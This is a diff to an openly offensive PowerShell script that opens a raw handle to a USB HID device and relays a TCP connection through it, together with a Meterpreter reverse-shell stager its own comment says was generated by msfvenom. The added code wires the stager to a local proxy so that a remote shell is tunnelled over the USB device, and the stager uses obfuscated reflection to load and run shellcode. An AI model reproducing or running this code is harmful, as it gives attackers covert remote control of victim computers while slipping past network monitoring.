@@ -1,21 +1,44 @@
+if ($M -eq $null) {
+	$M = 64
+	$cs = '
+	using System;
+	using System.IO;
+	using Microsoft.Win32.SafeHandles;
+	using System.Runtime.InteropServices;
+	namespace n {
+		public class w {
+			[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
+			public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
+			public static FileStream o(string fn) {
+				return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
+			}
+		}
+	}
+	'.Replace('%',[char]34)
+	Add-Type -TypeDefinition $cs
+	$devs = gwmi Win32_USBControllerDevice
+	foreach ($dev in $devs) {
+		$wmidev = [wmi]$dev.Dependent
+		if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
+			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+		}
+	}
+	$f = [n.w]::o($fn)
+}
+
 #================== Thread 1 code: the local proxy ==================
 $Proxy = {
 	Param($M, $device)
 	try {
 		[System.Console]::WriteLine("Entering proxy thread")
-	  $TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 65535)
-	  $TcpListener.Start()
-	  $TcpClient = $TcpListener.AcceptTcpClient()
-		[System.Console]::WriteLine("Connection received")
-	  $TcpListener.Stop()
-
-	  $socket = $TcpClient.GetStream()
+		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
+		$TcpListener.Start()
+		$tt = $TcpListener.BeginAcceptTcpClient($null, $null)
 
 		$sb = New-Object Byte[] ($M+1)
 		$db = New-Object Byte[] ($M+1)
-	  $nb = New-Object Byte[] ($M+1)
+		$nb = New-Object Byte[] ($M+1)
 
-		$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
 		$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
 
 		$stotal = 0
@@ -25,8 +48,15 @@ $Proxy = {
 		[System.Console]::WriteLine("Entering proxy loop")
 		[System.Console]::WriteLine([String]::Format("M is {0}", $M))
 		$device.Write($nb, 0, $M+1)
-		while ($st -ne $null -or $dt -ne $null) {
-			if ($st.IsCompleted -and $device_can_write) {
+		while ($tt -ne $null -or $st -ne $null -or $dt -ne $null) {
+			if ($tt -ne $null -and $tt.IsCompleted) {
+				$TcpClient = $TcpListener.EndAcceptTcpClient($tt)
+				$TcpListener.Stop()
+				[System.Console]::WriteLine("Connection received")
+				$tt = $null
+				$socket = $TcpClient.GetStream()
+				$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
+			} elseif ($st -ne $null -and $st.IsCompleted -and $device_can_write) {
 				$sbr = $socket.EndRead($st)
 				if ($sbr -gt 0) {
 					$stotal += $sbr
@@ -78,7 +108,6 @@ $MeterpreterStager = {
 	[System.Console]::WriteLine("Meterpreter thread started")
 	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 	# Generated using: msfvenom -p windows/shell/reverse_tcp -f psh-reflection LHOST=127.0.0.1 LPORT=65535
-	
 	function kxuXDoOD {
 		Param ($oeT1W4ZSIx, $faTmlV)
 		$drJ_cQvaI_YJ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
@@ -113,6 +142,7 @@ $proxyThread = [PowerShell]::Create()
 [void] $proxyThread.AddScript($Proxy)
 [void] $proxyThread.AddParameter("M", $M)
 [void] $proxyThread.AddParameter("device", $f)
+
 $meterpreterThread = [PowerShell]::Create()
 [void] $meterpreterThread.AddScript($MeterpreterStager)
 [System.IAsyncResult]$AsyncProxyJobResult = $null
@@ -121,6 +151,7 @@ $meterpreterThread = [PowerShell]::Create()
 try {
 	Write-Host "About to start proxy thread"
 	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
+
 	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
 	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
 }
